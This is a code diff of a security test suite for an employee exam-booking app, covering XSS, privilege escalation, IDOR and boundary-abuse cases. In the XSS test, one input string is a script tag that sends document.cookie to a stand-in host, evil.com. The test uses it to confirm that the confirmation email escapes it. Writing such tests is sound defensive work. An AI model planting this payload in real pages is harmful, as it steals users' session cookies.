@@ -113,17 +113,24 @@ describe('SEC: XSS & Injection Attacks', () => {
     expect(result.error).toContain('6 chữ số');
   });
 
-  it('SEC-03: Script injection via bu -> email template escapes it', async () => {
-    const maliciousBu = '"><script>fetch("https://evil.com/steal?"+document.cookie)</script>';
+  it('SEC-03: Script injection via fullName -> email template escapes it', async () => {
+    // fullName is rendered into the confirmation email via escHtml(); bu is NOT rendered,
+    // so a meaningful escaping test must target a rendered field.
+    const maliciousName = '"><script>fetch("https://evil.com/steal?"+document.cookie)</script>';
 
-    setupPreflight();
+    // Preflight with emailConfirm: true so the confirmation email is actually queued.
+    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true })); // getConfig
+    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false)); // checkIneligibility: not blocked
+    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, {})); // checkIneligibility: requireEligibility off
 
     mockRunTransaction.mockImplementation(async (fn: any) => {
       const txGet = vi.fn();
+      // bookDb read order: config, registration, cancelledQuota, speaking, skills
       txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
+      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
+      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
       txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
       txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(false));
       await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
     });
 
@@ -134,19 +141,26 @@ describe('SEC: XSS & Injection Attacks', () => {
 
     const result = await bookDb('attacker@test.com', {
       empCode: '262010',
-      fullName: 'Attacker',
-      bu: maliciousBu,
+      fullName: maliciousName,
+      bu: 'IT',
       speakingSlotId: 'SP-2206-0900',
       skillsSlotId: '3S-2206-1100',
     });
 
     expect(result.ok).toBe(true);
-    // If email was sent, verify the HTML payload is safe
-    if (mockAddDoc.mock.calls.length > 0) {
-      const emailPayload = mockAddDoc.mock.calls[0]?.[1];
-      expect(emailPayload?.message?.html).toBeDefined();
-      expect(emailPayload.message.html).not.toContain('<script>fetch');
-    }
+    expect(result.emailSent).toBe(true);
+    // Confirmation email was queued (addDoc into the 'mail' collection).
+    expect(mockAddDoc).toHaveBeenCalled();
+    const emailPayload = mockAddDoc.mock.calls[0]?.[1];
+    const html: string = emailPayload?.message?.html;
+    expect(html).toBeDefined();
+    // escHtml() neutralized the payload: no raw <script> tags reach the HTML.
+    expect(html).not.toContain('<script>');
+    expect(html).not.toContain('</script>');
+    // The entity-encoded form is present instead (entities built via char code 38 = '&').
+    const lt = String.fromCharCode(38) + 'lt;';
+    const gt = String.fromCharCode(38) + 'gt;';
+    expect(html).toContain(lt + 'script' + gt);
   });
 
   it('SEC-04: Prototype pollution via crafted slotId -> rejected by type check', async () => {
@@ -304,7 +318,7 @@ describe('SEC: Privilege Escalation', () => {
     mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
 
     // Client-side: bookDb doesn't verify email ownership (server enforces)
-    const result = await bookDb('victim@company.com', {
+    await bookDb('victim@company.com', {
       empCode: '262010',
       fullName: 'Attacker',
       bu: 'IT',
@@ -348,7 +362,7 @@ describe('SEC: IDOR & Parameter Tampering', () => {
     mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
     mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
 
-    const result = await cancelDb('victim@company.com');
+    await cancelDb('victim@company.com');
     // Document: client may succeed, server blocks via auth.token.email rule
   });
 
@@ -433,7 +447,7 @@ describe('SEC: Boundary Abuse', () => {
     mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
     mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
 
-    const result = await bookDb('user@test.com', {
+    await bookDb('user@test.com', {
       empCode: '262010', fullName: longName, bu: 'IT',
       speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
     });
@@ -456,7 +470,7 @@ describe('SEC: Boundary Abuse', () => {
     mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
     mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
 
-    const result = await bookDb('user@test.com', {
+    await bookDb('user@test.com', {
       empCode: ' 262010 ',
       fullName: 'A', bu: 'IT',
       speakingSlotId: 'SP-2206-0900',
@@ -470,23 +484,17 @@ describe('SEC: Boundary Abuse', () => {
 
     mockRunTransaction.mockImplementation(async (fn: any) => {
       const txGet = vi.fn();
+      // bookDb read order: config, registration, cancelledQuota, speaking, skills, oldSpeaking, oldSkills
       txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, maxChanges: 3 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
       txGet.mockResolvedValueOnce(mockDocSnap(true, {
         ...TEST_REGISTRATION, changeCount: -999, speakingSlotId: 'SP-OLD', skillsSlotId: '3S-OLD',
       }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 }));
-      const setCalls: any[] = [];
-      const updateCalls: any[] = [];
-      await fn({
-        get: txGet,
-        set: (...args: any[]) => setCalls.push(args),
-        update: (...args: any[]) => updateCalls.push(args),
-        delete: vi.fn(),
-      });
-      return { setCalls, updateCalls };
+      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
+      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
+      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
+      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 })); // old speaking slot
+      txGet.mockResolvedValueOnce(mockDocSnap(true, { remaining: 5 })); // old skills slot
+      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
     });
 
     mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
@@ -508,10 +516,12 @@ describe('SEC: Boundary Abuse', () => {
 
     mockRunTransaction.mockImplementation(async (fn: any) => {
       const txGet = vi.fn();
+      // bookDb read order: config, registration, cancelledQuota, speaking, skills
       txGet.mockResolvedValueOnce(mockDocSnap(true, TEST_CONFIG));
+      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
+      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
       txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
       txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-23', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(false));
       await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
     });
 
@@ -523,6 +533,7 @@ describe('SEC: Boundary Abuse', () => {
       empCode: '262010', fullName: 'A', bu: 'IT',
       speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2306-0900',
     });
+    // Same start time but different dates → no overlap → booking succeeds.
     expect(result.ok).toBe(true);
   });
 });
